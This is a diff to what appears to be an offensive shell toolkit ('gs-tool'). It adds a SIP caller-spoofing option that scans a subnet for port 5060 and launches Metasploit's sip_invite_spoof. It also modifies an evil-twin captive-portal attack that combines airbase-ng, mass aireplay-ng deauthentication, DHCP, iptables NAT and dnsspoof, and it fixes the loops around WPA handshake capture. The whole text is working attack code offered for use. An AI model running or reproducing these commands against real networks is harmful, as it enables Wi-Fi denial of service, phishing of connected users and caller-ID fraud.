@@ -148,6 +148,48 @@ reboot
 fi
 
 
+
+if [ $choix = "sip" ]
+then
+echo
+echo
+echo
+nmap 192.168.1.* -p 5060 --open
+echo
+echo
+echo
+echo
+echo Ip of the sip machine
+echo
+echo
+echo
+echo
+echo
+read -p 'ip address : ' ipsip
+echo
+echo
+echo
+echo
+echo
+echo
+read -p 'message : ' messagesip
+echo
+echo
+echo
+echo
+echo
+read -p 'phone number spoof : ' srcc
+echo
+echo
+echo
+echo
+echo
+
+xterm -title sip-spoof -e 'msfconsole -q -x "use auxiliary/voip/sip_invite_spoof; set MSG $messagesip; set rhost $ipsip; set SRCADDR $srcc; set RPORT 5060; run; " '
+fi
+
+
+
 if [ $choix = "nano" ]
 then
 nano gs-tool
@@ -314,7 +356,7 @@ read -p 'security : ' apsec
  xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w gscap $winterface | xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface | echo -e  '\e[1;35m  close window if there is hanshake '
  xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface
 
-      if [ $? = -eq 1 ]
+      if [ $? -eq 1 ]
       then
           while [ $? -ne "1" ]
           do
@@ -619,7 +661,7 @@ echo -e  '\e[1;32m '
 echo attack started ... 
 xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda
       
-      if [ $? = -eq 1 ]
+      if [ $? -eq 1 ]
       then
           while [ $? -ne "1" ]
           do
@@ -748,12 +790,25 @@ echo
 echo
 echo
 read -p 'bssid : ' bssidcpa
+echo
+echo
+echo
+echo channel of the acces point
+echo
+echo
+echo
+read -p 'ch : ' chcpa
 xterm -title cpa -e "airbase-ng $interfacecpa -e $apcpa -c 6" &
-sleep 2
+sleep 2.5
 ifconfig at0 up 192.168.3.1 netmask 255.255.255.0
-xterm -e dhcpd -d -f -cf dhcpd12.conf | xterm -e aireplay-ng $interfacecpa -0 9989 -a $bssidcpa &
-
-      if [ $? = -eq 1 ]
+xterm -e dhcpd -d -f -cf dhcpd12.conf &
+n_secondes=7
+( xterm -title wait... -e "airodump-ng $interfacecpa --bssid $bssidcpa -c $chcpa &>/dev/null") &
+sleep 5.5
+kill $!
+xterm -e aireplay-ng $interfacecpa -0 99989 -a $bssidcpa &
+sleep 5
+      if [ $? -eq 1 ]
       then
           while [ $? -ne "1" ]
           do
@@ -782,8 +837,8 @@ iptables --flush
   iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT \
     --to-destination 192.168.3.1:67
   iptables -t nat -A POSTROUTING -j MASQUERADE
-  service apache2 start
-xterm -e "dnsspoof -i at0 -f hostdns.txt host 192.168.3.1 and udp 53"
+  xterm -title apache -e "service apache2 start" &
+xterm -e "dnsspoof -i at0 -f hostdns.txt"
 fi
 
 
